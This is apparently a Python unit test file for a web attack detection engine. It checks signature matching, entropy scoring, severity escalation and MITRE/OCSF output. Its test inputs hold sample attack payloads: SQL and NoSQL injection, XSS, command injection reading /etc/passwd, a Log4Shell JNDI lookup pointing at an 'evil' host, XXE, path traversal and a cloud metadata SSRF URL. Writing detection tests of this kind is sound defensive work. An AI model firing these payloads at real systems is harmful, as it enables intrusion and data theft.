"""Unit tests for the Aegis detection engine.

Run locally:  python3 -m unittest discover -s tests
CI runs them with pytest (which discovers unittest.TestCase classes too).
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "lambdas", "detection"))

import detector  # noqa: E402


class TestSignatures(unittest.TestCase):
    def _has(self, event, rule):
        self.assertIn(rule, detector.signature_scan(event))

    def test_sqli(self):
        self._has({"query": "q=1' OR 1=1 --"}, "sqli")

    def test_union_select(self):
        self._has({"query": "q=1 UNION SELECT pass FROM users"}, "sqli")

    def test_xss(self):
        self._has({"query": "q=<script>alert(1)</script>"}, "xss")

    def test_command_injection(self):
        self._has({"query": "q=x; cat /etc/passwd"}, "command_injection")

    def test_ssti(self):
        self._has({"query": "q={{7*7}}"}, "ssti")

    def test_log4shell(self):
        self._has({"query": "q=${jndi:ldap://evil/x}"}, "log4shell")

    def test_nosqli(self):
        self._has({"body": '{"user":{"$ne":null}}'}, "nosqli")

    def test_xxe(self):
        self._has({"body": "<!DOCTYPE foo SYSTEM \"file:///etc/passwd\">"}, "xxe")

    def test_path_traversal(self):
        self._has({"path": "/api/products/../../etc/passwd"}, "path_traversal")

    def test_lfi(self):
        self._has({"query": "page=php://filter/resource=x"}, "lfi_rfi")

    def test_ssrf_metadata(self):
        self._has({"query": "url=http://169.254.169.254/latest/meta-data/"}, "ssrf")

    def test_sensitive_file(self):
        self._has({"path": "/.git/config"}, "sensitive_file")

    def test_scanner_user_agent(self):
        self._has({"user_agent": "sqlmap/1.7-dev"}, "scanner")

    def test_pii_card(self):
        self._has({"body": "card=4111 1111 1111 1111"}, "pii_exposure")

    def test_clean(self):
        self.assertEqual(detector.signature_scan(
            {"query": "q=orange juice", "user_agent": "Mozilla/5.0"}), [])

    def test_app_signal_passthrough(self):
        self._has({"signal": "unauthorized_admin_access", "path": "/admin"},
                  "unauthorized_admin_access")


class TestEntropy(unittest.TestCase):
    def test_low(self):
        self.assertLess(detector.shannon_entropy("aaaaaaaaaa"), 1.0)

    def test_high(self):
        self.assertGreater(detector.shannon_entropy("f8Kd9$2mZ!qW7#xP1&vR4^tL0"), 3.5)

    def test_anomaly_flag(self):
        self.assertTrue(detector.entropy_anomaly(
            {"query": "d=aGVsbG8gd29ybGQgZm9vIGJhciBiYXo9PT0xMjM0NTY3ODkw"}))

    def test_short_not_flagged(self):
        self.assertFalse(detector.entropy_anomaly({"query": "q=hi"}))


class TestScoring(unittest.TestCase):
    def test_sqli_high(self):
        self.assertEqual(detector.score(["sqli"], []), "HIGH")

    def test_xss_medium(self):
        self.assertEqual(detector.score(["xss"], []), "MEDIUM")

    def test_command_injection_critical(self):
        self.assertEqual(detector.score(["command_injection"], []), "CRITICAL")

    def test_corroboration_escalates(self):
        self.assertEqual(detector.score(["xss"], ["rate_anomaly"]), "HIGH")

    def test_new_source_does_not_escalate(self):
        self.assertEqual(detector.score(["xss"], ["new_source"]), "MEDIUM")

    def test_brute_force_high(self):
        self.assertEqual(detector.score([], ["brute_force"]), "HIGH")

    def test_escalate_caps(self):
        self.assertEqual(detector.escalate("CRITICAL", 3), "CRITICAL")


class TestMitreOcsf(unittest.TestCase):
    def test_mitre_lookup(self):
        techs = detector.mitre_for(["sqli", "brute_force"])
        ids = {t["technique"] for t in techs}
        self.assertIn("T1190", ids)
        self.assertIn("T1110", ids)

    def test_mitre_dedup(self):
        techs = detector.mitre_for(["sqli", "sqli"])
        self.assertEqual(len(techs), 1)

    def test_ocsf_shape(self):
        f = detector.ocsf_finding({"src_ip": "8.8.8.8", "ts_epoch": 1},
                                  ["sqli"], "HIGH", "fid-1")
        self.assertEqual(f["class_uid"], 2004)
        self.assertEqual(f["severity_id"], 4)
        self.assertTrue(f["attacks"])


class TestCatalogIntegrity(unittest.TestCase):
    def test_every_rule_valid_severity(self):
        for r in detector.RULES:
            self.assertIn(r["severity"], detector.SEVERITY_ORDER, r["id"])

    def test_ids_unique(self):
        ids = [r["id"] for r in detector.RULES]
        self.assertEqual(len(ids), len(set(ids)))

    def test_signature_rules_compile(self):
        # accessing .search proves each signature compiled
        for r in detector.SIGNATURE_RULES:
            self.assertTrue(hasattr(r["sig"], "search"), r["id"])

    def test_rule_count(self):
        self.assertGreaterEqual(len(detector.RULES), 20)


if __name__ == "__main__":
    unittest.main(verbosity=2)
